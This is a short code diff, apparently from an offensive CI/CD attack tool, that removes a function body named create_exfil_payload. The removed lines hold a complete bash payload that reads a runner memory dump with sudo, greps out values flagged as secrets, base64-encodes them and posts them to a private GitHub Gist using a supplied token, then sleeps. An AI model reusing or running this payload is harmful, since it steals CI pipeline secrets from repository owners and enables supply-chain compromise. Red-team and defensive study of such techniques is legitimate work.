@@ -102,26 +102,6 @@ fi
     def create_exfil_payload():
         """Creates a Gist hosting an exfiltration payload."""
 
-        payload = """
-if [[ "$OSTYPE" == "linux-gnu" ]]; then
-  ENCODED_MEMDUMP="{}"
-  B64_BLOB=`base64 -d $ENCODED_MEMDUMP | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' | sort -u | base64 -w 0`
-  GIST_TOKEN="{}"
-  GIST_TOKEN_DECODED=`echo $GIST_TOKEN | base64 -d`
-
-  curl -L \
-    -X POST \
-    -H "Accept: application/vnd.github+json" \
-    -H "Authorization: Bearer $GIST_TOKEN_DECODED" \
-    -H "X-GitHub-Api-Version: 2022-11-28" \
-    https://api.github.com/gists -d '{"public":false,"files":{"Exfil":{"content":"'$B64_BLOB'"}}}' > /dev/null
-
-    sleep 900
-else
-  exit 0
-fi
-"""
-
     @staticmethod
     def create_ror_workflow(
         workflow_name: str,
